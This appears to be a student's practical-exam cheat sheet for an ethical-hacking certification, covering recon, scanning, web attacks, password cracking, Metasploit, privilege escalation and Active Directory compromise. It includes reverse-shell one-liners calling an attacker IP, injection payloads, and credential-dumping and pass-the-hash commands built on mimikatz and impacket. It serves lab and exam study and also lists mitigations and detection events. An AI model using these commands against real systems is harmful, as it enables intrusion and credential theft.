# CEHP — Exam Roadmap (Practical Notes)

> Keep this open during the exam. Commands first, theory only where it helps you remember *why*.
> Attackbox for this exam: **ParrotSec**. Username/password wordlists are **provided** during the exam — don't waste time building your own unless told to.

---

## Table of Contents
1. [General Methodology](#1-general-methodology)
2. [Reconnaissance](#2-reconnaissance)
3. [Network Scanning (Nmap)](#3-network-scanning-nmap)
4. [Service Enumeration](#4-service-enumeration)
5. [Web Application Hacking](#5-web-application-hacking)
6. [Password Attacks](#6-password-attacks)
7. [Metasploit Framework](#7-metasploit-framework)
8. [Privilege Escalation](#8-privilege-escalation)
9. [SSH Tips](#9-ssh-tips)
10. [Active Directory](#10-active-directory)
11. [Steganography](#11-steganography)
12. [Cryptography (general)](#12-cryptography-general)
13. [Mobile / Android — Known Gap](#13-mobile--android--known-gap)
14. [Reporting](#14-reporting)
15. [Final Checklist](#15-final-checklist)

---

## 1. General Methodology

**Web:**
Reconnaissance & Enumeration → Vulnerability identification → Exploitation → (Privesc if shell) → Document the chain.

**Infrastructure:**
1. **Enumeration** — what do you know, what's left to find?
2. **Vulnerability analysis** — misconfig? outdated version? known exploit?
3. **Initial access**
4. **Privilege escalation** — find a way up from inside
5. **Reporting**

Always log IP, ports, service versions, and any credentials found into a local `notes.txt` as you go — don't rely on memory under time pressure.

[↑ Back to top](#table-of-contents)

---

## 2. Reconnaissance

### Passive Recon
```bash
whois <domain>
# RDAP (whois successor)
curl https://rdap.verisign.com/domain/<domain>/v1
dig <domain> ANY
dig [@server] <domain> <TYPE>     # types: A, AAAA, CNAME, MX, SOA, TXT
nslookup <domain>
theHarvester -d <domain> -b all
```
- Online whois alternatives: `whois.icann.org`, `lookup.icann.org` (more RDAP-focused)
- `dnsdumpster.com` — passive DNS mapping
- **Certificate Transparency logs:** `crt.sh` → search `%.<domain>`
- `jq` — useful for parsing JSON API output during recon

### Active Recon
```bash
whatweb <url>
wafw00f <url>
```
- Browser extensions: **FoxyProxy** (proxy switching), **Wappalyzer** (tech fingerprinting), **User-Agent Switcher**
- Browser dev tools: Inspector / Debugger / Network / Storage tabs

**Ping:**
- Fast replies / no loss → target up → go to port scanning
- "Destination host unreachable" → target down or no route
- 100% loss, no error → ICMP filtered/blocked → try TCP/UDP discovery with nmap instead

**Traceroute:**
```bash
traceroute <ip>
mtr <ip>        # real-time path monitoring
```

[↑ Back to top](#table-of-contents)

---

## 3. Network Scanning (Nmap)

### Host discovery
```bash
nmap -sn <subnet>/24              # ping sweep
nmap -Pn -PR -sn <target>         # ARP discovery, no port scan
```
Discovery probe options: `-PE` (ICMP echo), `-PP` (ICMP timestamp), `-PM` (ICMP address mask), `-PS` (TCP SYN ping), `-PA` (TCP ACK ping), `-PU` (UDP ping). `-R` forces reverse DNS lookup even on offline hosts.
- Local network → nmap defaults to ARP requests.
- Remote → defaults to ICMP echo + TCP ACK(80) + TCP SYN(443) + ICMP timestamp.

### Port scans
```bash
nmap -p- --min-rate=1000 -T4 <ip>     # fast full TCP port sweep
nmap -sT <ip>     # TCP connect scan — only option without root, default unprivileged
nmap -sS <ip>     # TCP SYN scan — default when privileged
nmap -sU --top-ports 20 <ip>          # UDP scan (often forgotten, often necessary)
```
- `-T0` to `-T5`: timing template, `T0` slowest/stealthiest
- `--min-rate <n>` / `--max-rate <n>`: packets/sec
- `--top-ports n`: scan n most common ports
- `masscan` — alternative for very fast large-range scans

### Service/version + scripts
```bash
nmap -sCV -p<ports> <ip>
nmap -sV --version-intensity <0-9> <ip>   # 0=light (--version-light), 9=thorough, 3-way handshake required
nmap -O <ip>                # OS detection
nmap --traceroute <ip>
nmap --script vuln <ip>
nmap --script=<script1,script2> <ip>
```
- `-sC` = `--script=default`
- Script categories: `auth`, `discovery`, `exploit`, `vuln`, `malware`, etc.
- Scripts stored at `/usr/share/nmap/scripts/`

### Output
```bash
nmap -oN out.txt / -oG out.gnmap / -oX out.xml / -oA basename   # normal/greppable/xml/all
```

[↑ Back to top](#table-of-contents)

---

## 4. Service Enumeration

### FTP (21)
```bash
ftp <ip>                      # try anonymous:anonymous
nmap --script ftp-anon <ip>
```

### SSH (22)
Check version → look for a matching CVE. Brute force only as a last resort (see [Password Attacks](#6-password-attacks)).

### SMB (139/445)
```bash
smbclient -L //<ip>/ -N
smbclient //<ip>/<share> -N
smbmap -H <ip>
nmap -p445 --script smb-enum-shares <ip>
enum4linux -a <ip>            # or enum4linux-ng -A <ip> -oA results.txt
crackmapexec smb <ip> -u '' -p ''
```

### LDAP (389/636)
```bash
ldapsearch -x -H ldap://<ip> -s base
ldapsearch -x -H ldap://<ip> -b "dc=domain,dc=loc" "(objectClass=person)"
```
Anonymous bind can expose user accounts and directory info.

### RPC / null sessions
```bash
rpcclient -U "" <ip> -N
# once inside:
enumdomusers
```

**RID cycling** (enumerate users via RID range):
```bash
for i in $(seq 500 2000); do echo "queryuser $i" | rpcclient -U "" -N <ip> 2>/dev/null | grep -i "User Name"; done
```

### HTTP/HTTPS (80/443)
```bash
curl -I http://<ip>                       # stack/header info
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,html
nikto -h <url>
```
Also check manually: page source, `robots.txt`, `sitemap.xml`, exposed `.git`.

### SNMP (161)
```bash
snmpwalk -c public -v1 <ip>
onesixtyone -c community.txt <ip>
```

### SMTP (25)
```bash
smtp-user-enum -M VRFY -U users.txt -t <ip>
```

### Databases
```bash
mysql -h <ip> -u root -p
nmap --script mysql-empty-password <ip>
```

[↑ Back to top](#table-of-contents)

---

## 5. Web Application Hacking

### Walking the application
- Browse every page/feature, note down functionality as you go.
- View page source, use dev tools (Inspector, Network, Storage).

### IDOR (Insecure Direct Object Reference)
The app references objects (profile, document, order) via a predictable ID and doesn't verify the requester is authorized for that specific object.
```bash
curl -s -b "PHPSESSID=<id>" "http://<ip>/profile.php?id=1"
# try id=1, id=2, id=3... if data returns for IDs that aren't yours → IDOR confirmed
```
Attack chain reminder: IDOR often pairs well with a weak password-reset mechanism.

### File Upload
- Check whether the restriction is **client-side only** (easy bypass) or also **server-side**.
- If server-side: is it checking file **extension only**, or file **content** too? Try alternate extensions.
- You need to know the **stored folder path** and whether the file gets **renamed** to actually execute the payload.
- Pairs naturally with RCE → reverse shell.
- After getting a shell: always check `/etc/passwd` and do further enumeration for privesc.

### Injections
**SQL Injection (manual probing):**
```
' OR '1'='1
' UNION SELECT null,null,null-- -
```

**XSS:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

**Command Injection:**
```
; whoami
| whoami
`whoami`
$(whoami)
```

### SQLmap cheatsheet (common CTF variations)
```bash
# Basic GET parameter
sqlmap -u "http://<ip>/page.php?id=1" --batch --dbs

# POST data
sqlmap -u "http://<ip>/login.php" --data "user=a&pass=b" --batch --dbs

# Cookie-based injection (mark injection point with *)
sqlmap -u "http://<ip>/page.php" --cookie "PHPSESSID=xxx; id=1*" --batch --dbs

# From a captured request file (e.g. Burp "Copy to file")
sqlmap -r request.txt --batch --dbs

# Force deeper testing when default level/risk finds nothing
sqlmap -u "http://<ip>/page.php?id=1" --level=5 --risk=3 --batch

# Enumerate once a DB is confirmed injectable
sqlmap -u "http://<ip>/page.php?id=1" -D <db> --tables --batch
sqlmap -u "http://<ip>/page.php?id=1" -D <db> -T <table> --columns --batch
sqlmap -u "http://<ip>/page.php?id=1" -D <db> -T <table> -C <col1,col2> --dump --batch

# OS shell (needs DBA rights + stacked queries support, e.g. MSSQL/PostgreSQL)
sqlmap -u "http://<ip>/page.php?id=1" --os-shell --batch

# WAF/filter evasion, random UA
sqlmap -u "http://<ip>/page.php?id=1" --tamper=space2comment --random-agent --batch
```

### Reverse shells
```bash
# Bash
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

# PHP
php -r '$sock=fsockopen("<attacker_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'

# Listener on attacker side
nc -lvnp <port>
```

**Stabilize the shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on your side:
stty raw -echo; fg
```

[↑ Back to top](#table-of-contents)

---

## 6. Password Attacks

**Types:**
- Password guessing — needs some knowledge of the target
- Dictionary attack
- Brute force
- Credential stuffing — one cred reused against other services
- Password spraying — one (or few) password against many accounts, avoids lockouts
- Hybrid — dictionary + pattern (e.g. append year)

**Reminder:** username & password wordlists are **provided** during this exam.

**Tools:**
```bash
hydra -l <user> -P <wordlist> <ip> <service>
hydra -L <userlist> -P <passlist> <ip> <service>
medusa
wfuzz
hashcat -m <mode> hash.txt wordlist.txt -a <attack_mode>
john --wordlist=<wordlist> hash.txt
crackmapexec / netexec (nxc)     # esp. for AD, see section 10
```
- Also: Burp Suite Intruder for web login forms.
- Modern wordlists: SecLists, crackstation, breach compilations.
- `hashid <hash>` to identify a hash type before choosing a mode.

**Mitigations (for the report):** strong password policy + MFA, account lockout / throttling / rate limiting, IP-based controls, passwordless auth (passkeys, magic links).

[↑ Back to top](#table-of-contents)

---

## 7. Metasploit Framework

```bash
msfconsole -q                     # quiet start
search <service/CVE/software>
use <exploit_path_or_index>       # or just the number shown in search results
show options
set RHOSTS <ip>
set <required options as needed>
show payloads
set payload <payload_path>        # e.g. cmd/unix/reverse — pick the default suggested for that exploit
set LHOST <attacker_ip>
set LPORT <port>
exploit                            # or: run
```
Once you have a session:
```bash
sessions -l          # list sessions
sessions -i <id>      # interact with a session
background            # Ctrl+Z, drop back to msf prompt without killing session
```
`searchsploit <service>` (outside msfconsole) is a fast way to check for known exploits/PoCs before touching Metasploit.

[↑ Back to top](#table-of-contents)

---

## 8. Privilege Escalation

### Linux
```bash
./linpeas.sh
sudo -l
find / -perm -4000 2>/dev/null      # SUID binaries
cat /etc/crontab
uname -a                             # check for a kernel exploit
```
→ Check any SUID/sudo binary found against **GTFOBins**.

### Windows
```powershell
whoami /priv
systeminfo
winPEAS.exe
PowerUp.ps1
```
→ Look for misconfigured services, AlwaysInstallElevated, unquoted service paths.

[↑ Back to top](#table-of-contents)

---

## 9. SSH Tips

```bash
ssh-keygen -t ed25519 -C "mail" -a 100     # Ed25519, more secure than RSA
ssh-copy-id user@remote_ip
ssh -i ~/.ssh/custom_key user@ip           # use a specific key
ssh -J bastion.example.com user@internal_ip   # jump host
ssh -L 8080:localhost:80 user@ip -N        # local port forwarding
ssh -D 3050 user@ip -N                     # dynamic port forwarding (SOCKS)
ssh user@ip "cat /etc/passwd"              # run a single command
```
Prefer `sftp` over `scp` for security. See [Pivoting](#pivoting) for exam-relevant tunneling patterns.

[↑ Back to top](#table-of-contents)

---

## 10. Active Directory

### AD Basics
- **Domain** = users/computers under centralized administration; the **Domain Controller (DC)** runs AD Domain Services (catalog of users, groups, machines, printers, shares).
- **User** = security principal; privileges are based on domain role.
- **Machine objects** are also security principals — local admin on their own box, password auto-rotated (120 random chars), account name `[ComputerName]$`.
- **Default groups:** Domain Admins (full domain priv), Enterprise Admins (full forest priv), Server Operators (DC admin, can't touch admin group membership), Backup Operators (bypass file permissions), Account Operators (create/modify accounts), Domain Users, Domain Computers, Domain Controllers.
- **OUs** — group objects sharing policy requirements.
- **Auth protocols:** Kerberos (modern default), NetNTLM (legacy).
- **Trees/Forests:** self-managed subdomains form trees under a root; a forest can contain only **one** root domain but multiple trees.
- **Trust relationships:** direction matters — if D.AAA trusts D.BBB, BBB can access AAA's resources; trust just enables communication, access control is still enforced separately.

| Trust type | Direction | Transitive | Auto/Manual | Scope |
|---|---|---|---|---|
| Parent-Child | 2-way | Yes | Auto | Same forest |
| Tree-Root | 2-way | Yes | Auto | Same forest |
| Shortcut | 2-way | Yes | Manual | Same forest |
| Forest | 1/2-way | Yes | Manual | Across forest |
| External | 1/2-way | No | Manual | Interop w/ legacy NT4 |

**Kerberos auth flow (simplified):**
1. Client → AS/KDC: username+timestamp (enc. w/ user hash) → gets back TGT + session key.
2. Client → TGS/KDC: username+timestamp (enc. w/ session key) + TGT + SPN → gets back TGS (service ticket) + service session key.
3. Client → Service: TGS + username+timestamp → service validates with its own hash, grants access.

**NetNTLM flow:** Client → SRV (auth req) → SRV sends challenge → Client sends hashed response → SRV forwards to DC → DC verifies using stored user hash, tells SRV allow/deny.

**RDP:**
```bash
xfreerdp /u:<user> /p:"<password>" /d:<domain> /v:<server_ip>
```

### Breaching / OSINT
- Gather usernames: LinkedIn (`linkedin2username`), GitHub/GitLab, public breach data, corporate site, job listings.
- Common formats: `first.last`, `firstlast`, `flast`, `first.l`.

**Username enumeration (Kerberos pre-auth trick — no lockout risk):**
```bash
kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
```
Kerberos returns `KDC_ERR_C_PRINCIPAL_UNKNOWN` for invalid usernames vs. a pre-auth prompt for valid ones.

**DNS enumeration:**
```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain> <dc_ip>     # find DCs
nslookup -type=SRV _kerberos._tcp.<domain> <dc_ip>            # find KDC
nslookup -type=MX <domain> <dc_ip>
```

**Credential discovery in exposed sources:**
```bash
git log -p | grep -i "password\|secret\|token\|key\|credential"
trufflehog git file:///path/to/repo
```
Also check: internal wikis, network share configs, LDAP anonymous binds, SNMP community strings.

**Password spraying (one password, whole userlist, respect lockout window):**
```bash
nxc smb <dc_ip> -u 'validuser' -p 'validpassword' --pass-pol      # check policy first
nxc smb <dc_ip> -u clean_users.txt -p 'SprayedPass1!' --continue-on-success
nxc smb <dc_ip> -u clean_users.txt -p 'SprayedPass1!' --continue-on-success --jitter 2-5
```
`--jitter` adds random delay between attempts to reduce lockout/detection risk. Works across smb, rdp, ldap, winrm, mssql.

**LDAP Passback attack (network printers/MFPs):**
1. Access the device admin panel (defaults: `admin:admin` HP, blank pass Ricoh, `ADMIN:canon` Canon).
2. Go to LDAP config page.
3. Replace the LDAP server IP with your attacker IP (+ a listener port).
4. Trigger "Test Connection" — device sends its stored LDAP creds to your listener.
Works because devices are rarely hardened: default creds, over-privileged service accounts, plaintext LDAP (389 vs LDAPS 636), no credential rotation.

**File-based coercion (NTLM hash capture via `.url` icon UNC path):**
A malicious `.url` file with an `IconFile` pointing to `\\<attacker_ip>\share\icon.ico` on a writable share triggers Windows Explorer to silently authenticate (SMB) as soon as the folder is browsed — no click needed. Capture with Responder, crack with hashcat.

### Enumeration (unauthenticated)
```bash
fping <target>
nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt

# SMB
smbclient -L //<ip> -N
smbmap -H <ip>
nmap -p445 --script smb-enum-shares <ip>
enum4linux-ng -A <ip> -oA results.txt

# LDAP anonymous bind
ldapsearch -x -H ldap://<ip> -s base
ldapsearch -x -H ldap://<ip> -b "dc=<domain>,dc=loc" "(objectClass=person)"

# RPC null session
rpcclient -U "" <ip> -N
```

### Enumeration (authenticated)
**AS-REP Roasting** (accounts with Kerberos pre-auth disabled):
```bash
impacket-GetNPUsers <domain>/ -dc-ip <dc_ip> -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
hashcat -m 18200 hashes.txt wordlist.txt
```

**Manual Windows enumeration:**
```cmd
whoami /all
hostname & systeminfo & set
net user /domain
net user <user> /domain
net group /domain
net group "Domain Admins" /domain
net localgroup administrators
quser & tasklist
dir C:\Users
wmic service get Name,StartName
sc query state= all
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKLM /f "password" /t REG_SZ /s
schtasks /query
```

**ActiveDirectory PowerShell module / PowerView:**
```powershell
Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties LastLogonDate,MemberOf,Title,Description,PwdLastSet
Get-ADUser -Filter "Name -like '*admin*'"
Get-ADGroup -Filter *
Get-ADGroupMember -Identity "Domain Admins"
Get-ADComputer -Filter * | Select Name,OperatingSystem
Get-ADDefaultDomainPasswordPolicy

Import-Module .\PowerView.ps1
Get-DomainUser *admin*
Get-DomainGroup "*admin*"
Get-DomainComputer
```

**BloodHound:**
```bash
# Collector, run from a domain-joined Windows box:
SharpHound.exe --CollectionMethods All --Domain <domain> --ExcludeDCs
# or remotely:
bloodhound-python -u <user> -p <pass> -d <domain> -ns <dns_server> -c All --zip
```
Import the zip into BloodHound-CE web UI → Explore tab for the graph (nodes = users/computers/groups, edges = relationships/permissions). Use **Pathfinding** (start node = your compromised principal, end node = e.g. Domain Admins) to find an attack path automatically.

### Kerberos Attacks

**Kerberoasting** (crack service account passwords via TGS):
```bash
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <dc_ip> -request
hashcat -m 13100 service_ticket.txt wordlist.txt
```

**Golden Ticket** (forge a TGT — needs KRBTGT hash + domain SID):
```bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
```

**Silver Ticket** — same idea but forged with a **service account's** password hash, for a specific service only, without contacting the KDC.

**Weak password hash cracking:**
```bash
# SAM format reminder: username:uid:LM_hash:NTLM_hash:::
hashcat -m <mode> hashfile rockyou.txt -a <attack_mode>
```

**Pass-the-Hash** — see [Credential Harvesting](#credential-harvesting--lateral-movement) below.

### Credential Harvesting & Lateral Movement

**Goal of the chain:** local admin on a domain-joined workstation → harvest creds from every store → escalate to Domain Admin → SYSTEM shell on the DC.

**Roadmap:** `vault` → `SAM+SYSTEM` → `LSASS` → `LSA cache (DCC2)` → `secretsdump (local)` → crack DCC2 → `secretsdump -just-dc (DCSync)` → Pass-the-Hash → DA shell on DC.

> Run mimikatz **as Administrator** (Defender flags it — expect it to be off in the lab).

| Store | Holds | Access | Privileges needed | Tool |
|---|---|---|---|---|
| **LSASS memory** | NTLM hashes, Kerberos tickets, sometimes cleartext | Dump live `lsass.exe` | Local Admin + `SeDebugPrivilege` | mimikatz `sekurlsa::logonpasswords` |
| **SAM + SYSTEM hives** | Local account NTLM hashes | Export hives, decrypt w/ boot key | Local Admin | `reg save` then mimikatz `lsadump::sam` |
| **LSA Secrets** | Cached domain creds, plaintext service creds | Registry via LSARPC | SYSTEM local / Local Admin remote | mimikatz `lsadump::secrets`; `impacket-secretsdump` |
| **DCC2 / MSCacheV2** | Offline domain-logon hashes (`$DCC2$…`) | On-disk LSA cache | SYSTEM local / Local Admin via secretsdump | mimikatz `lsadump::cache`; crack: `john --format=mscash2` — **not** Pass-the-Hash-able |
| **DPAPI Vault** | Saved app passwords (RDP, browser, WiFi) | User token or master key | User context | mimikatz `vault::list`, `vault::cred /export` |
| **NTDS.dit** (DC only) | Full domain DB: usernames, NTLM & Kerberos keys | DCSync (MS-DRSR replication) or offline parse | Domain Admin / replication rights | `impacket-secretsdump -just-dc`; mimikatz `lsadump::dcsync` |

**Commands:**
```bash
# DPAPI vault (mimikatz)
vault::list
vault::cred /export

# SAM + SYSTEM
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
# mimikatz:
lsadump::sam /sam:"C:\...\SAM" /system:"C:\...\SYSTEM"

# LSASS memory
privilege::debug
sekurlsa::logonpasswords          # only shows creds with an ACTIVE session

# LSA cache (DCC2)
privilege::debug
token::elevate
lsadump::cache

# Remote dump, local admin creds (no binary upload needed)
impacket-secretsdump <domain>/Administrator:<password>@<workstation_ip> -output local_dump

# Crack DCC2 offline
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# DCSync — full domain DB, needs Domain Admin rights
impacket-secretsdump <domain>/<DA_user>:<password>@<dc_ip> -just-dc -output dc_dump

# Pass-the-Hash → SYSTEM shell on DC
impacket-psexec '<domain>/Administrator@<dc_ip>' -hashes :<NTLM_HASH>
```
**Key exam reminders:** NT hash → Pass-the-Hash usable. DCC2/MSCacheV2 → crack-only. `-just-dc` = DCSync. LSASS only shows creds for active sessions. `privilege::debug` for LSASS, `token::elevate` for LSA cache/secrets. `secretsdump` output line format: `username:RID:LMhash:NThash:::` (RID 500 = built-in Administrator).

**Lateral movement — remote execution methods:**

| Method | Tool | Mechanism | Noise | Notes |
|---|---|---|---|---|
| PsExec | `impacket-psexec` | SMB → upload service binary → SCM `CreateServiceW` | High (Event 7045, 4-char random service name) | Gives **SYSTEM** shell |
| WinRM | `evil-winrm` | WinRM 5985/5986 | Low (Event 4624 Type 3) | Runs as the auth'd user; needs Admins or Remote Management Users |
| WMI | `impacket-wmiexec` | DCOM `Win32_Process.Create` | Lower — no service, no file on disk | Good when PsExec is blocked |
| DCOM | `impacket-dcomexec` | `MMC20.Application`/`ShellWindows` | Low | When SCM is locked but DCOM available |
| SMBExec | `impacket-smbexec` | Service runs `cmd.exe /c`, output to temp file | Medium (7045, no disk binary) | AV catches PsExec's uploaded binary |
| AtExec | `impacket-atexec` | One-shot scheduled task | Medium (Event 4698) | When SCM + DCOM both locked down |
| RDP | `xfreerdp` | Full GUI, port 3389 | High (4624 Type 10) | When GUI access is needed |
| NetExec | `nxc smb <ip> -x '<cmd>'` | SMB one-off command | Varies | Quick, no full session |

```bash
# Pre-check local admin access
nxc smb <target_ip> -u <user> -p '<pass>' -d <domain>     # look for (Pwn3d!)

# PsExec → SYSTEM
impacket-psexec <domain>/<user>:'<pass>'@<target_ip>

# WinRM → user shell
evil-winrm -i <target_ip> -u <user> -p '<pass>'

# NetExec one-off command
nxc smb <target_ip> -u <user> -p '<pass>' -d <domain> -x 'whoami /all'    # cmd.exe
nxc smb <target_ip> -u <user> -p '<pass>' -d <domain> -X '$PSVersionTable'  # PowerShell
```

**Pass-the-Hash / credential reuse:**
```bash
# Spray a local NT hash across hosts to find where you're admin
nxc smb <ip1> <ip2> -u Administrator -H <NT_HASH> --local-auth

# Shell with a hash
impacket-psexec -hashes <LM_HASH>:<NT_HASH> Administrator@<target_ip>
impacket-psexec -hashes :<NT_HASH> Administrator@<target_ip>      # empty LM
evil-winrm -i <target_ip> -u Administrator -H <NT_HASH>

# Pass-the-Ticket (mimikatz / Rubeus)
kerberos::ptt ticket.kirbi
Rubeus.exe ptt /ticket:ticket.kirbi

# Overpass-the-Hash (NT hash → Kerberos TGT)
sekurlsa::pth /user:Administrator /domain:<domain> /ntlm:<NT_HASH> /run:cmd.exe

# Token Impersonation (Meterpreter, already SYSTEM)
use incognito
list_tokens -u
impersonate_token "<domain>\\Administrator"
```
Empty/disabled LM hash constant: `aad3b435b51404eeaad3b435b51404ee`.

**Hash-type reminder:**

| Type | Source | Format | Pass-the-Hash? |
|---|---|---|---|
| NT hash | SAM, NTDS.dit, LSASS (mimikatz, secretsdump) | 32 hex chars | **Yes** |
| Net-NTLMv2 | Captured off the wire (Responder, LLMNR poisoning) | multi-field, long | **No** — crack or relay only |

**Detection Event IDs (for the report):**
| Event | Log | Meaning |
|---|---|---|
| 4624 (Type 3) | Security | Network logon — every SMB/WinRM/WMI technique |
| 4648 | Security | Explicit credentials used |
| 7045 | System | New service installed — PsExec/SMBExec signature |
| 4697 | Security | Service installed (newer equivalent of 7045) |
| 4698 | Security | Scheduled task created — AtExec signature |
| 4688 | Security | Process creation (needs cmdline auditing) |

### Pivoting
```bash
# SSH local port forward — one specific service (e.g. DC RDP)
ssh -L 13389:<dc_ip>:3389 <user>@<pivot_ip> -N
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'<pass>' /cert:ignore

# SSH dynamic forward — SOCKS proxy for many hosts/ports
ssh -f -D 1080 <user>@<pivot_ip> -N
```
`/etc/proxychains.conf` → comment default line, add:
```
socks4 127.0.0.1 1080
```
```bash
proxychains nxc smb <dc_ip> -u Administrator -H <NT_HASH>
proxychains impacket-psexec -hashes :<NT_HASH> <domain>/Administrator@<dc_ip>
```

**Chisel** (no SSH available):
```bash
chisel server --port 8080 --reverse            # attackbox
chisel.exe client <attackbox_ip>:8080 R:1080:socks   # compromised Windows host
```

**Ligolo-ng** (TUN interface, no ProxyChains needed):
```bash
sudo ./proxy -selfcert                                          # attackbox
./agent -connect <attackbox_ip>:11601 -accept-fingerprint <fp>  # compromised host
sudo ip route add <subnet>/24 dev ligolo
nxc smb <subnet>/24 -u <user> -p '<pass>'
```

**ProxyChains exam traps:**
- TCP only — UDP/ICMP silently dropped (`nmap -sU` and `ping` won't work through it).
- Use `nmap -sT` (connect scan), not `-sS` (needs raw sockets).
- Always add `-Pn` to nmap through a proxy chain (skip host discovery).
- DNS can leak — uncomment `proxy_dns` in `proxychains.conf` if needed.

**AD key takeaways:** Local admin ≠ Domain Admin, but a DA's cached creds on a "low value" box = the whole domain. NT hash → passable; Net-NTLMv2 → crack/relay only. PsExec = SYSTEM but noisy; WinRM = user context but quiet. Reused local-admin password across hosts (no LAPS) = one hash unlocks the network.

[↑ Back to top](#table-of-contents)

---

## 11. Steganography

**Linux tools:**
```bash
exiftool <file>                       # metadata
binwalk <file>                        # embedded files/signatures
binwalk -e <file>                     # extract embedded content
foremost <file>                       # carve files by signature
steghide info <file>                  # check if steghide-protected
steghide extract -sf <file>           # extract (may prompt for passphrase)
stegseek <file> <wordlist>            # fast steghide passphrase cracker
zsteg <file.png/bmp>                  # LSB stego for PNG/BMP
strings <file> | less                 # quick text/flag scan
```

**QR codes on Windows:**
- Screenshot the code, then decode via an online decoder (e.g. zxing.org) if network/browser access is allowed in the exam environment.
- If Python is available on the box: `pip install pyzbar pillow`, then
  ```python
  from pyzbar.pyzbar import decode
  from PIL import Image
  print(decode(Image.open("qr.png")))
  ```

[↑ Back to top](#table-of-contents)

---

## 12. Cryptography (general)

- Identify unknown encodings first: **CyberChef** ("Magic Wand" auto-detect).
- Base64: `echo <string> | base64 -d`
- Weak/common hash → try `crackstation.net` or hashcat with rockyou.
- Caesar/Vigenère → CyberChef "Brute Force" operation, or `dcode.fr` if allowed offline/locally.

[↑ Back to top](#table-of-contents)

---

## 13. Mobile / Android — Known Gap

You haven't covered a dedicated Android pentest room. Minimal survival commands only — not exhaustive:
```bash
adb devices
adb shell
adb shell pm list packages
adb pull /data/app/<package>/base.apk
apktool d app.apk
jadx-gui app.apk                     # more readable than apktool for Java code
grep -r "password\|api_key\|secret" app_decompiled/
adb root
adb shell
su
```
If a task is specifically about Android crypto/Keystore internals, it's likely too deep to improvise live — prioritize other tasks first and come back if time allows.

[↑ Back to top](#table-of-contents)

---

## 14. Reporting

**Layout:**
- Cover page: title, name, email, version control
- Table of contents (optional)
- Executive summary
- Technical summary (for the engineering manager)
- Vulnerability table, ordered by severity
- Detailed exploitation section per finding: **Vulnerability → Severity → Impact → Exploitation steps → Remediation**

Document the full attack chain, not just the final flag — partial credit often depends on it.

[↑ Back to top](#table-of-contents)

---

## 15. Final Checklist

- [ ] Flag/proof captured and noted (screenshot if possible)
- [ ] Exact exploitation path written down (needed if a report is required)
- [ ] Any credentials found are noted, even if unused — may still count
- [ ] Wordlists provided for the exam are being used, not reinvented
- [ ] Attack chain documented as you go, not reconstructed from memory at the end

[↑ Back to top](#table-of-contents)
